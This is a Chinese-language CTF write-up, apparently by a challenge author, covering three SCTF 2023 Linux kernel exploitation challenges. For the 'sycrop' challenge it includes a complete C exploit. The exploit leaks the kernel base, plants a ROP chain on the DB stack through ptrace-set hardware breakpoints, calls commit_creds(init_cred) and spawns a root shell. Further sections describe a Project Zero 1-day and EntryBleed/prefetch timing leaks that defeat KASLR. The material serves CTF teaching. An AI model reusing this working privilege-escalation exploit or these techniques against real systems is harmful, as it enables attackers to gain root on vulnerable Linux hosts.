# SCTF2023_kernelpwn
SCTF 2023 kernel pwn

题外话：打个广告 笔者是2024届毕业本科学生，参加今年秋招，欢迎联系~
## sycrop

这道题想考察的是两个点。

1. cpu entry area mapping区域的起始点有几个和内核text段偏移固定的地址，具体参考下图，这只是一个小trick，首次出现在谷歌的KCTF，后面在国际赛中出现过几次

![image](https://github.com/pray77/SCTF2023_kernelpwn/assets/74857519/5533b765-153c-443b-9ce1-a966832bf5eb)

![3Z(ZSS7$2~V)YR~PGD 7%KY](https://github.com/pray77/SCTF2023_kernelpwn/assets/74857519/2f5d94e2-6606-4b78-a7e8-60825135aded)



1. 通过下硬件断点在用户态触发的方式，可以将寄存器内容推送到与per cpu entry area固定偏移的DB stack上，而在linux 6.2之前， per cpu entry area没有加入随机化，地址固定，所以可以达到在内核固定地址造ROP链的手段，这是本题的创新点，笔者暂且命名为： ret2hbp，命名只是方便大家描述这种攻击手法，笔者并不声称独创性，事实上，内核利用的发展路程本身的魅力已经足够吸引人，在海边沙滩上捡到一个贝壳已经足够开心 : )

具体地址和偏移相关参考exp，还是希望各位师傅能自己调试一番

```c
#define _GNU_SOURCE
#include <sched.h>
#include <sys/mman.h>
#include <pthread.h>
#include <semaphore.h>
#include <sys/ptrace.h>
#include <signal.h>
#include <sys/wait.h>
#include <stddef.h>
#include <asm/user_64.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/utsname.h>
#include <stdbool.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/prctl.h>
#include <fcntl.h>

void* map;
#define PAGE_SIZE 0x1000
pid_t hbp_pid;
unsigned long kernel_base;
unsigned long init_cred;
unsigned long commit_cred;
unsigned long pop_rdi;
unsigned long swapgs_restore_regs_and_return_to_usermode;

size_t user_cs, user_ss, user_rflags, user_sp;

void saveStatus()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
}

void teardown()
{
    kill(hbp_pid,9);
}

void create_hbp(void* addr)
{

    if(ptrace(PTRACE_POKEUSER,hbp_pid, offsetof(struct user, u_debugreg), addr) == -1) {
        printf("Could not create hbp! ptrace dr0: %m\n");
        teardown();
        exit(1);
    }

    if(ptrace(PTRACE_POKEUSER,hbp_pid, offsetof(struct user, u_debugreg) + 56, 0xf0101) == -1) {
        printf("Could not create hbp! ptrace dr7: %m\n");
        teardown();
        exit(1);
    }
}

void hbp_raw_fire()
{
    if(ptrace(PTRACE_CONT,hbp_pid,NULL,NULL) == -1)
        {
            printf("Failed to PTRACE_CONT: %m\n");
            teardown();
            exit(1);
        }
}
void getRootShell(void)
{   
    if(getuid()) {
        printf("\033[31m\033[1m[x] Failed to get the root!\033[0m\n");
        exit(-1);
    }

    puts("\033[32m\033[1m[+] Successful to get the root. "
         "Execve root shell now...\033[0m");
    system("/bin/sh");
}
size_t getshelladdr = &getRootShell;
void init(unsigned cpu)
{
    cpu_set_t mask;
    map = mmap((void*) 0x0a000000,0x1000000,PROT_READ | PROT_WRITE,MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED,0,0);
    switch(hbp_pid = fork())
    {
        case 0: //child
            //pin cpu

            CPU_ZERO(&mask);
            CPU_SET(cpu,&mask);
            sched_setaffinity(0,sizeof(mask),&mask);
            ptrace(PTRACE_TRACEME,0,NULL,NULL);
            raise(SIGSTOP);
            __asm__(
                "mov r15,   0xbeefdead;"
                "mov r14,   pop_rdi;"
                "mov r13,   init_cred;" // start at there
                "mov r12,   commit_cred;"
                "mov rbp,   swapgs_restore_regs_and_return_to_usermode;"
                "mov rbx,   0x77777777;"
                "mov r11,   0x77777777;"
                "mov r10,   getshelladdr;"
                "mov r9,    user_cs;"
                "mov r8,    user_rflags;"
                "mov rax,   user_sp;"
                "mov rcx,   user_ss;"
                "mov rdx,   0xcccccccc;"
                "mov rsi,   0xa000000;"
                "mov rdi,   [rsi];"
            );
            exit(1);
        case -1:
            printf("fork: %m\n");
            exit(1);
        default: //parent. Just exit switch
            break;
    }
    int status;
    //Watch for stop:
    puts("Waiting for child");
    while(waitpid(hbp_pid,&status,__WALL) != hbp_pid || !WIFSTOPPED(status))
    {
        sched_yield();
    }
    puts("Setting breakpoint");
    create_hbp(map);
}

int main()
{
    saveStatus();
    int fd = open("/dev/seven", O_RDWR);
    if(fd < 0) perror("Error open");
    unsigned long addr =  ioctl(fd,0x5555,0xfffffe0000000000+4);
    printf("0x%llx\n",addr-0x1008e00);
    kernel_base = addr-0x1008e00;
    init_cred = kernel_base + 0xffffffffbd64cbf8 - 0xffffffffbbc00000;
    commit_cred = kernel_base + 0xffffffffbbcbb5b0 - 0xffffffffbbc00000;
    pop_rdi = kernel_base + 0xffffffff81002c9d - 0xffffffff81000000;
    swapgs_restore_regs_and_return_to_usermode = kernel_base + 0xffffffff82000f01 - 0xffffffff81000000;
    init(1);
    hbp_raw_fire();
    waitpid(hbp_pid,NULL,__WALL);
    hbp_raw_fire();
    waitpid(hbp_pid,NULL,__WALL);
    ioctl(fd,0x6666,0xfffffe0000010f60);
}
```

## sycrpg

事实上，这只是一道1day利用题，基本思路就是谷歌pj0的这一篇文章，笔者所做工作只是把它出成一道CTF题，方便大家学习到这个我个人觉得威力强大且有趣的利用方法，体会只能在一个地址写一个字节就能getshell的魅力。
https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html?m=1


## moonpray

这是一道涉及到内核信息泄露0day的题，然而存在了非预期解（两个做出的队伍都是非预期）

题目为去掉了leak的sycrop加强版，因为版本用的是6.2，per cpu entry area添加了随机化

1. 首先还是得leak ，这里涉及的点是CPU 漏洞，注意到启动脚本中的 -enable-kvm和-cpu host，用的是物理机的cpu，事实上，大部分情况下，intel cpu都受到这个漏洞的影响，具体参考1day Entrybleed文章（https://www.willsroot.io/2022/12/entrybleed.html#comment-form），用上面的脚本即可跑出kaslr
2. 接下来的ROP部分，按照sycrop的思路，应该栈迁移到DB stack上，但此时per cpu entry area加入了随机化，所以DB stack也跟着随机化（它在per cpu entry area + 0xf000这个偏移上），但事实上，KPTI开启的情况下，不止系统调用入口点会被映射到用户态（EntryBleed的entry_SYSCALL_64），per cpu entry area也被映射，所以是可以通过预取指令计算时间差的方法得到偏移的，具体脚本得等厂商同意披露才能发（但其实上面已经讲明白了相信师傅们能搓出来）
3. 关于非预期，rop部分可以采用ret2dir，这是笔者的疏忽，出题时也想过ret2dir能不能打，但时间关系完成了题目主体部分居然就忘了管这事了，不过也还好，起码这道题能有解 (


